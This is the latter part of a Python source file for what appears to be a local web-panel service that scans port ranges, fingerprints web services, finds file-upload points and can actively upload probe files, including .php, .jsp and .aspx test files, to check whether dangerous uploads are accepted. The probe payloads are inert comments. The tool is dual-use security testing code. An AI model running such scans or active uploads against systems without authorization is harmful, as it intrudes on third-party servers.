            if word.lower() in low and not any(f in low for f in FAIL_WORDS):
                accepted = True
                evidence = "响应含成功关键字 %r" % word
                break

    if not evidence:
        if res.get("status") in (200, 201) and filename in text:
            accepted = True
            evidence = "响应回显文件名 %s" % filename
        elif res.get("status") in (200, 201) and not any(f in low for f in FAIL_WORDS):
            evidence = "HTTP %d，未见拒绝关键字" % res["status"]

    snippet = re.sub(r"\s+", " ", text)[:240]
    return {"accepted": accepted, "evidence": evidence, "snippet": snippet,
            "status": res.get("status"), "url": found_url}


def detect_upload(base: str, info: dict, opts: dict, emit) -> dict:
    """返回 {"score": high|medium|low|none, "items": [...], "dirs": [...]}"""
    items: list[dict] = []
    dirs: list[dict] = []
    timeout = opts.get("timeout", 6.0)
    strength = opts.get("strength", "standard")

    def add(kind: str, url: str, risk: str, evidence: str, extra: dict | None = None):
        item = {"type": kind, "url": url, "risk": risk, "evidence": evidence}
        if extra:
            item.update(extra)
        items.append(item)

    html = info.get("text", "")
    parsed = urlsplit(info.get("url") or base)
    origin = "%s://%s" % (parsed.scheme, parsed.netloc)

    # 1) 页面内上传表单
    for m in re.finditer(r"<form\b[^>]*>(.*?)</form>", html, re.I | re.S):
        block = m.group(0)
        tag = block[: block.find(">") + 1]
        inner = m.group(1)
        if not re.search(r"type\s*=\s*[\"']?file", inner, re.I):
            continue
        action = urljoin(info["url"], attr(tag, "action") or info["url"])
        enc = attr(tag, "enctype") or "application/x-www-form-urlencoded"
        method = (attr(tag, "method") or "GET").upper()
        add("form", action, "medium",
            "上传表单：method=%s enctype=%s" % (method, enc),
            {"method": method, "enctype": enc, "field": _field_name(inner)})

    # 2) 页面/JS 关键字
    hits = []
    for pattern, label in UPLOAD_KEYWORDS:
        if re.search(pattern, html, re.I):
            hits.append(label)
    if hits:
        add("keyword", info["url"], "low", "页面特征：" + "、".join(hits[:6]))

    # 3) 同源链接里的上传页
    links = set()
    for m in re.finditer(r'(?:href|action)\s*=\s*["\']([^"\'>]+)', html, re.I):
        href = m.group(1).strip()
        if href.startswith(("#", "javascript:", "mailto:")):
            continue
        full = urljoin(info["url"], href)
        if not full.startswith(origin):
            continue
        if re.search(r"upload|上传|file|attach|image|img|editor", full, re.I):
            links.add(full)
    for link in list(links)[:12]:
        page = page_info(link, timeout)
        if not page:
            continue
        if re.search(r"type\s*=\s*[\"']?file", page["text"], re.I):
            add("page", link, "medium", "页面 %s 含文件上传控件" % (page["title"] or "无标题"))
        elif page["status"] < 400:
            add("page", link, "low", "疑似上传相关页面（HTTP %d）" % page["status"])

    # 4) 常见上传接口/目录
    paths = UPLOAD_PATHS if strength != "fast" else UPLOAD_PATHS[:12]
    if strength == "deep":
        paths = UPLOAD_PATHS + ["/upload1", "/upload2", "/uploads.php", "/uploadfile.php",
                                "/sys/upload", "/fileUpload.do", "/upload/upload.php"]
    candidates: list[dict] = []

    # 软 404 基线：SPA/统一错误页会对任意路径返回 200，避免误报
    soft = None
    base_res = fetch(origin + "/lp_%s_notfound" % uuid.uuid4().hex[:10],
                     timeout=timeout, max_body=8192)
    if base_res.get("status"):
        soft = (base_res["status"], len(base_res.get("body", b"")),
                hashlib.md5(base_res.get("body", b"")).hexdigest())

    def is_soft(status: int, body: bytes) -> bool:
        if not soft:
            return False
        return status == soft[0] and (hashlib.md5(body).hexdigest() == soft[2]
                                      or abs(len(body) - soft[1]) <= 40)

    def probe_path(path: str):
        url = origin + path
        res = fetch(url, timeout=timeout, max_body=8192)
        if res.get("error") or not res.get("status"):
            return None
        body = res.get("body", b"")
        if is_soft(res["status"], body):
            return None
        return {"url": url, "path": path, "status": res["status"],
                "length": len(body)}

    with ThreadPoolExecutor(max_workers=8) as pool:
        for out in pool.map(probe_path, paths):
            if not out:
                continue
            if out["status"] in (200, 201, 204, 405, 500) and out["length"] > 0:
                candidates.append(out)
            if out["path"].endswith("/") and out["status"] == 200:
                dirs.append(out)

    for c in candidates[:20]:
        risk = "medium" if c["status"] in (200, 201) else "low"
        add("endpoint", c["url"], risk,
            "接口存在：HTTP %d，响应 %d 字节" % (c["status"], c["length"]))

    # 5) 目录列举
    for d in dirs:
        res = fetch(d["url"], timeout=timeout, max_body=16384)
        text = res.get("body", b"").decode("utf-8", "replace")
        if re.search(r"Index of /|<title>\s*Index of", text, re.I):
            add("dirlist", d["url"], "medium", "目录可列举（Index of）")

    # 6) 危险方法
    opt = fetch(origin + "/", method="OPTIONS", timeout=timeout)
    allow = opt.get("headers", {}).get("allow", "") if opt else ""
    if allow and re.search(r"\b(PUT|DELETE)\b", allow, re.I):
        add("method", origin + "/", "medium", "Allow: " + allow)

    # 7) 主动上传测试
    if opts.get("active_upload") and (items or dirs):
        targets: list[dict] = []
        for it in items:
            if it["type"] in ("form", "endpoint", "page"):
                targets.append({"url": it["url"], "field": it.get("field") or ""})
        seen_url = set()
        uniq = []
        for t in targets:
            if t["url"] in seen_url:
                continue
            seen_url.add(t["url"])
            uniq.append(t)

        marker = MARKER + uuid.uuid4().hex[:8]
        for t in uniq[:15]:
            fields = ([t["field"]] if t.get("field") else []) + FIELD_NAMES
            fields = list(dict.fromkeys(fields))[:4]
            accepted = None
            for field in fields:
                body, ctype = multipart_body(field, "lp_probe.txt",
                                              ("%s hello" % marker).encode())
                res = fetch(t["url"], method="POST", body=body,
                            headers={"Content-Type": ctype}, timeout=timeout)
                if res.get("error"):
                    continue
                verdict = analyze_upload_response(res, "lp_probe.txt")
                if verdict["accepted"]:
                    accepted = (field, res, verdict)
                    break
            if not accepted:
                continue

            field, res, verdict = accepted
            risk = "medium"
            evidence = "字段 %s 上传被接受：%s" % (field, verdict["evidence"] or "HTTP %d" % res["status"])

            # 回显 URL 可访问 → 高危
            if verdict.get("url"):
                check_url = urljoin(t["url"], verdict["url"])
                chk = fetch(check_url, timeout=timeout, max_body=8192)
                if chk.get("status") == 200 and marker.encode() in chk.get("body", b""):
                    risk = "high"
                    evidence += "；回显地址可访问（%s）" % check_url

            add("upload", t["url"], risk, evidence,
                {"field": field, "snippet": verdict.get("snippet", "")[:200]})

            # 危险扩展名
            if opts.get("dangerous_ext"):
                for ext, payload in (("php", b"<?php /*lingops-probe*/ ?>"),
                                     ("jsp", b"<%-- lingops-probe --%>"),
                                     ("aspx", b"<%-- lingops-probe --%>")):
                    body, ctype = multipart_body(field, "lp_probe." + ext, payload)
                    res2 = fetch(t["url"], method="POST", body=body,
                                 headers={"Content-Type": ctype}, timeout=timeout)
                    if res2.get("error"):
                        continue
                    v2 = analyze_upload_response(res2, "lp_probe." + ext)
                    if v2["accepted"]:
                        add("dangerous", t["url"], "high",
                            "允许上传 .%s 文件（%s）" % (ext, v2["evidence"] or "HTTP %d" % res2["status"]))
                        break

    score = "none"
    if any(i["risk"] == "high" for i in items):
        score = "high"
    elif any(i["risk"] == "medium" for i in items):
        score = "medium"
    elif items:
        score = "low"
    return {"score": score, "items": items, "dirs": dirs}


def _field_name(inner: str) -> str:
    m = re.search(r'<input[^>]*type\s*=\s*["\']?file[^>]*>', inner, re.I)
    if m:
        return attr(m.group(0), "name")
    return ""


# ---------------------------------------------------------------- 任务调度

class Job:
    def __init__(self, params: dict):
        self.id = uuid.uuid4().hex[:12]
        self.params = params
        self.status = "pending"
        self.phase = "准备中"
        self.total = 0
        self.done = 0
        self.hosts: dict[str, dict] = {}
        self.logs: list[str] = []
        self.cancel = False
        self.created = time.time()
        self.finished = None
        self.lock = threading.Lock()

    def log(self, msg: str):
        with self.lock:
            self.logs.append(log_line(msg))
            if len(self.logs) > 800:
                del self.logs[:200]

    def snapshot(self) -> dict:
        with self.lock:
            return {
                "id": self.id,
                "status": self.status,
                "phase": self.phase,
                "total": self.total,
                "done": self.done,
                "elapsed": int((self.finished or time.time()) - self.created),
                "logs": self.logs[-200:],
                "hosts": [
                    {
                        "ip": h["ip"],
                        "ports": h["ports"],
                        "web": h.get("web", []),
                        "upload": h.get("upload", []),
                        "risk": h.get("risk", "none"),
                    }
                    for h in sorted(
                        (x for x in self.hosts.values() if x["ports"]),
                        key=lambda x: _ip_to_int(x["ip"])
                        if re.fullmatch(r"\d+\.\d+\.\d+\.\d+", x["ip"]) else 0)
                ],
            }


def run_job(job: Job):
    p = job.params
    try:
        job.status = "running"
        targets, extra_ports = parse_targets(p.get("targets", ""))
        ports = parse_ports(p.get("ports", "common"))
        for ep in extra_ports:
            if ep not in ports:
                ports.append(ep)
        ports = sorted(set(ports))
        if not targets:
            raise ValueError("没有解析到有效目标")
        if not ports:
            raise ValueError("没有解析到有效端口")

        timeout = float(p.get("timeout") or 1.0)
        timeout = max(0.2, min(10.0, timeout))
        concurrency = int(p.get("concurrency") or 300)
        concurrency = max(10, min(200 if _IS_WIN else 1000, concurrency))

        job.total = len(targets) * len(ports)
        job.phase = "端口扫描"
        job.log("目标 %d 个，端口 %d 个，共 %d 个探测任务（并发 %d，超时 %.1fs）"
                % (len(targets), len(ports), job.total, concurrency, timeout))

        with job.lock:
            for ip in targets:
                job.hosts[ip] = {"ip": ip, "ports": [], "web": [], "upload": [], "risk": "none"}

        tasks = [(ip, port) for ip in targets for port in ports]
        batch = 4000
        for start in range(0, len(tasks), batch):
            if job.cancel:
                break
            chunk = tasks[start:start + batch]
            with ThreadPoolExecutor(max_workers=concurrency) as pool:
                futures = {pool.submit(tcp_scan, ip, port, timeout): (ip, port)
                           for ip, port in chunk}
                for fut in as_completed(futures):
                    if job.cancel:
                        break
                    ip, port = futures[fut]
                    try:
                        res = fut.result()
                    except Exception:
                        res = None
                    with job.lock:
                        job.done += 1
                    if res:
                        with job.lock:
                            job.hosts[ip]["ports"].append(res)
                        job.log("%s:%d 开放 (%s)" % (ip, port, res["service"]))
            if job.cancel:
                break

        if job.cancel:
            job.status = "cancelled"
            job.log("任务已取消")
            job.finished = time.time()
            return

        open_hosts = [h for h in job.hosts.values() if h["ports"]]
        job.log("端口扫描完成：%d/%d 台主机有开放端口" % (len(open_hosts), len(targets)))

        # HTTP 探测
        if p.get("do_http", True) and open_hosts:
            job.phase = "HTTP 探测"
            for h in open_hosts:
                if job.cancel:
                    break
                web_probed = 0
                for portinfo in h["ports"]:
                    if web_probed >= 40:
                        break
                    port = portinfo["port"]
                    looks_web = (port in WEB_PORTS or "HTTP" in (portinfo["service"] or "")
                                 or port not in KNOWN_NON_WEB)
                    if not looks_web:
                        continue
                    web_probed += 1
                    scheme = "https" if port in TLS_PORTS else "http"
                    info = page_info("%s://%s:%d/" % (scheme, h["ip"], port))
                    if not info and scheme == "https":
                        info = page_info("http://%s:%d/" % (h["ip"], port))
                    if not info and scheme == "http":
                        info = page_info("https://%s:%d/" % (h["ip"], port))
                    if info:
                        if portinfo.get("service") in ("unknown", ""):
                            portinfo["service"] = "HTTPS" if info["url"].startswith("https") else "HTTP"
                        portinfo["web"] = {k: v for k, v in info.items() if k != "text"}
                        h["web"].append({"port": port, **portinfo["web"]})
                        job.log("%s:%d 是 Web 服务（HTTP %s %s）"
                                % (h["ip"], port, info["status"], info["title"][:40]))
                        portinfo["_info"] = info

        # 上传点探测
        if p.get("upload_detect", True) and open_hosts:
            job.phase = "上传点探测"
            for h in open_hosts:
                if job.cancel:
                    break
                for portinfo in h["ports"]:
                    info = portinfo.get("_info")
                    if not info:
                        continue
                    base = "%s://%s:%d" % (urlsplit(info["url"]).scheme, h["ip"], portinfo["port"])
                    try:
                        result = detect_upload(base, info, {
                            "timeout": 6.0,
                            "strength": p.get("strength", "standard"),
                            "active_upload": bool(p.get("active_upload")),
                            "dangerous_ext": bool(p.get("dangerous_ext")),
                        }, job.log)
                    except Exception as exc:  # noqa: BLE001
                        job.log("%s:%d 上传点探测异常：%s" % (h["ip"], portinfo["port"], exc))
                        continue
                    if result["items"]:
                        h["upload"].append({"port": portinfo["port"], **result})
                        job.log("%s:%d 发现 %d 个上传相关点（风险 %s）"
                                % (h["ip"], portinfo["port"], len(result["items"]), result["score"]))

                scores = [u["score"] for u in h["upload"]]
                for level in ("high", "medium", "low"):
                    if level in scores:
                        h["risk"] = level
                        break

        job.phase = "完成"
        job.status = "completed"
        job.log("扫描完成，用时 %d 秒" % int(time.time() - job.created))
    except Exception as exc:  # noqa: BLE001
        job.status = "failed"
        job.log("任务失败：%s" % exc)
        traceback.print_exc()
    finally:
        for h in job.hosts.values():
            for portinfo in h["ports"]:
                portinfo.pop("_info", None)
        job.finished = time.time()


JOBS: dict[str, Job] = {}
JOBS_LOCK = threading.Lock()


# ---------------------------------------------------------------- HTTP 服务

ALLOWED_ORIGIN_HOSTS = {"127.0.0.1", "localhost", "::1", "[::1]"}


def cors_headers(origin: str | None) -> dict:
    headers = {
        "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
        "Access-Control-Allow-Headers": "Content-Type, Authorization",
        "Access-Control-Max-Age": "600",
    }
    if origin:
        host = urlsplit(origin).hostname or ""
        if host in ALLOWED_ORIGIN_HOSTS or host.startswith("127."):
            headers["Access-Control-Allow-Origin"] = origin
    else:
        headers["Access-Control-Allow-Origin"] = "*"
    return headers


class Handler(BaseHTTPRequestHandler):
    server_version = "LingOpsScan/" + VERSION
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *args):  # 静音访问日志
        return

    # -- helpers
    def _send(self, code: int, payload, ctype="application/json; charset=utf-8", extra=None):
        if isinstance(payload, (dict, list)):
            body = json.dumps(payload, ensure_ascii=False).encode()
        elif isinstance(payload, bytes):
            body = payload
        else:
            body = str(payload).encode()
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        for k, v in cors_headers(self.headers.get("Origin")).items():
            self.send_header(k, v)
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        self.end_headers()
        try:
            self.wfile.write(body)
        except Exception:
            pass

    def _json_body(self, max_bytes: int = MAX_BODY) -> dict:
        try:
            length = int(self.headers.get("Content-Length") or 0)
            if length > max_bytes:
                raise ValueError("body too large")
            raw = self.rfile.read(length) if length else b"{}"
            return json.loads(raw.decode("utf-8") or "{}")
        except Exception:
            return {}

    def _serve_awdp(self, path: str):
        rest = path[len("/awdp/"):]
        sid, _, sub = rest.partition("/")
        sdir = awdp_session_dir(sid)
        if not sdir:
            self._send(404, {"error": "会话不存在或已删除"})
            return

        if sub in ("", "index.html"):
            target = os.path.join(sdir, "index.html")
            ctype = "text/html; charset=utf-8"
        elif sub == "raw":
            rel = unquote(parse_qs(self.path).get("p", [""])[0])
            safe = _safe_rel(rel)
            if not safe:
                self._send(400, {"error": "非法路径"})
                return
            target = os.path.realpath(os.path.join(sdir, safe))
            if not target.startswith(os.path.realpath(sdir) + os.sep) or not os.path.isfile(target):
                self._send(404, {"error": "文件不存在"})
                return
            ctype = "text/plain; charset=utf-8"
        elif sub in AWDP_GENERATED or re.fullmatch(r"[\w\-.]+\.(md|txt|json|py)", sub):
            target = os.path.join(sdir, sub)
            ctype = {"md": "text/markdown; charset=utf-8",
                     "json": "application/json; charset=utf-8"}.get(sub.rsplit(".", 1)[-1],
                                                                  "text/plain; charset=utf-8")
        else:
            self._send(404, {"error": "not found"})
            return

        if sub in AWDP_TOOL_FILES:
            _awdp_copy_make_patch(sdir)     # 老会话没有这个文件，现场补一份

        if sub in ("prompt.txt", "README.md", "local-ai.md") and \
                not _prompt_has_patch_rules(os.path.join(sdir, sub)):
            _awdp_backfill_prompt(sdir)     # 老会话的提示词没有 patch 规范，重写一份

        if sub in ("", "index.html") and not _index_has_new_links(target):
            _awdp_backfill_index(sdir)      # 老会话的目录页没有新按钮，重建一份
        elif not os.path.isfile(target) and sub in ("attack-plan.md", "fix-plan.md",
                                                    "local-ai.md"):
            # 老会话缺这几个文件，按 findings.json 现场补一份
            if _awdp_backfill(sdir, sub):
                ctype = "text/markdown; charset=utf-8"

        try:
            with open(target, "rb") as fh:
                body = fh.read()
        except Exception:
            self._send(404, {"error": "文件不存在"})
            return
        self._send(200, body, ctype)

    # -- routes
    def do_OPTIONS(self):
        self._send(204, b"", "text/plain")

    def do_GET(self):
        path = urlsplit(self.path).path.rstrip("/") or "/"
        if path in ("/", "/api/health"):
            self._send(200, {"ok": True, "version": VERSION, "jobs": len(JOBS)})
            return
        if path == "/api/awdp/sessions":
            self._send(200, {"root": awdp_root(), "sessions": list_awdp_sessions()})
            return
        if path.startswith("/awdp/"):
            self._serve_awdp(path)
            return
        m = re.fullmatch(r"/api/jobs/([0-9a-f]+)", path)
        if m:
            job = JOBS.get(m.group(1))
            if not job:
                self._send(404, {"error": "任务不存在"})
            else:
                self._send(200, job.snapshot())
            return
        m = re.fullmatch(r"/api/jobs/([0-9a-f]+)/export", path)
        if m:
            job = JOBS.get(m.group(1))
            if not job:
                self._send(404, {"error": "任务不存在"})
                return
            fmt = (parse_qs(self.path).get("fmt", ["json"])[0] or "json").lower()
            if fmt == "csv":
                self._send(200, export_csv(job), "text/csv; charset=utf-8",
                           {"Content-Disposition": 'attachment; filename="lingops-scan-%s.csv"' % job.id})
            else:
                self._send(200, json.dumps(export_json(job), ensure_ascii=False, indent=2),
                           "application/json; charset=utf-8",
                           {"Content-Disposition": 'attachment; filename="lingops-scan-%s.json"' % job.id})
            return
        self._send(404, {"error": "not found"})

    def do_POST(self):
        path = urlsplit(self.path).path.rstrip("/") or "/"
        if path == "/api/awdp/session":
            params = self._json_body(AWDP_MAX_BODY)
            if not params:
                self._send(400, {"error": "请求体为空或过大"})
                return
            host = self.headers.get("Host") or "127.0.0.1:12801"
            try:
                res = create_awdp_session(params, "http://" + host)
            except Exception as exc:
                self._send(400, {"error": str(exc)})
                return
            self._send(200, res)
            return
        if path == "/api/awdp/delete":
            params = self._json_body()
            sdir = awdp_session_dir(str(params.get("id") or ""))
            if not sdir:
                self._send(404, {"error": "会话不存在"})
                return
            try:
                shutil.rmtree(sdir)
            except Exception as exc:
                self._send(500, {"error": str(exc)})
                return
            self._send(200, {"ok": True, "deleted": sdir})
            return
        if path == "/api/discover":
            params = self._json_body()
            targets = (params.get("targets") or "").strip()
            if not targets:
                self._send(400, {"error": "请填写探测目标"})
                return
            try:
                timeout = min(5.0, max(0.2, float(params.get("timeout") or 1.0)))
            except Exception:
                timeout = 1.0
            ports = params.get("ports")
            if isinstance(ports, str):
                ports = [int(p) for p in re.findall(r"\d{1,5}", ports) if 0 < int(p) < 65536]
            use_icmp = params.get("icmp", True) not in (False, "false", 0, "0")
            try:
                self._send(200, discover_hosts(targets, timeout, ports, use_icmp))
            except Exception as exc:
                self._send(400, {"error": str(exc)})
            return
        if path == "/api/scan":
            params = self._json_body()
            if not (params.get("targets") or "").strip():
                self._send(400, {"error": "请填写扫描目标"})
                return
            job = Job(params)
            with JOBS_LOCK:
                JOBS[job.id] = job
                if len(JOBS) > 30:
                    for key in sorted(JOBS, key=lambda k: JOBS[k].created)[:10]:
                        if JOBS[key].status in ("completed", "failed", "cancelled"):
                            JOBS.pop(key, None)
            threading.Thread(target=run_job, args=(job,), daemon=True).start()
            self._send(200, {"job_id": job.id})
            return
        m = re.fullmatch(r"/api/jobs/([0-9a-f]+)/cancel", path)
        if m:
            job = JOBS.get(m.group(1))
            if not job:
                self._send(404, {"error": "任务不存在"})
                return
            job.cancel = True
            self._send(200, {"ok": True})
            return
        self._send(404, {"error": "not found"})


def parse_qs(path: str) -> dict:
    from urllib.parse import parse_qs as _pq
    return _pq(urlsplit(path).query)


def export_json(job: Job) -> dict:
    snap = job.snapshot()
    snap["params"] = job.params
    return snap


def export_csv(job: Job) -> str:
    buf = io.StringIO()
    writer = csv.writer(buf)
    writer.writerow(["目标", "端口", "服务", "HTTP状态", "标题", "Server", "上传点数量",
                     "最高风险", "上传点明细"])
    for h in job.snapshot()["hosts"]:
        web_map = {w["port"]: w for w in h["web"]}
        up_map = {u["port"]: u for u in h["upload"]}
        for p in h["ports"]:
            port = p["port"]
            web = web_map.get(port, {})
            up = up_map.get(port, {})
            detail = " | ".join("%s[%s] %s" % (i["type"], i["risk"], i["url"])
                                for i in up.get("items", []))
            writer.writerow([h["ip"], port, p.get("service", ""), web.get("status", ""),
                             web.get("title", ""), web.get("server", ""),
                             len(up.get("items", [])), up.get("score", "none"), detail])
    return buf.getvalue()


def main():
    parser = argparse.ArgumentParser(description="LingOps 端口扫描 / 上传点探测扩展服务")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=12801)
    parser.add_argument("--scan", help="命令行模式：目标（IP/CIDR/域名）")
    parser.add_argument("--discover", help="命令行模式：只做存活探测（ICMP + TCP 兜底）")
    parser.add_argument("--no-icmp", action="store_true", help="命令行模式：存活探测跳过 ICMP")
    parser.add_argument("-p", "--ports", default="common", help="命令行模式：端口")
    parser.add_argument("--upload", action="store_true", help="命令行模式：探测上传点")
    parser.add_argument("--active-upload", action="store_true", help="命令行模式：主动上传测试")
    parser.add_argument("--dangerous-ext", action="store_true", help="命令行模式：危险扩展名测试")
    parser.add_argument("--strength", default="standard", choices=["quick", "standard", "deep"],
                        help="命令行模式：上传点探测强度")
    parser.add_argument("--timeout", type=float, default=1.0, help="命令行模式：连接超时（秒）")
    parser.add_argument("--concurrency", type=int, default=300, help="命令行模式：并发线程")
    parser.add_argument("--csv", action="store_true", help="命令行模式：输出 CSV（默认 JSON）")
    args = parser.parse_args()

    if args.discover:
        res = discover_hosts(args.discover, args.timeout, None, not args.no_icmp)
        print(json.dumps(res, ensure_ascii=False, indent=2))
        return

    if args.scan:
        job = Job({"targets": args.scan, "ports": args.ports,
                   "do_http": True, "upload_detect": args.upload,
                   "active_upload": args.active_upload,
                   "dangerous_ext": args.dangerous_ext,
                   "strength": args.strength,
                   "timeout": args.timeout, "concurrency": args.concurrency})
        run_job(job)
        print(export_csv(job) if args.csv else
              json.dumps(export_json(job), ensure_ascii=False, indent=2))
        return

    srv = ThreadingHTTPServer((args.host, args.port), Handler)
    srv.daemon_threads = True
    print("LingOps 扫描扩展已启动: http://%s:%d  (Ctrl+C 停止)" % (args.host, args.port))
    print("面板地址: http://127.0.0.1:12800/assets_v2/lp-ext/panel.html")
    print("AI 修复包目录: %s   (链接: http://%s:%d/awdp/<id>/)" % (awdp_root(), args.host, args.port))
    sys.stdout.flush()
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("\n已停止")
        srv.shutdown()


if __name__ == "__main__":
    main()
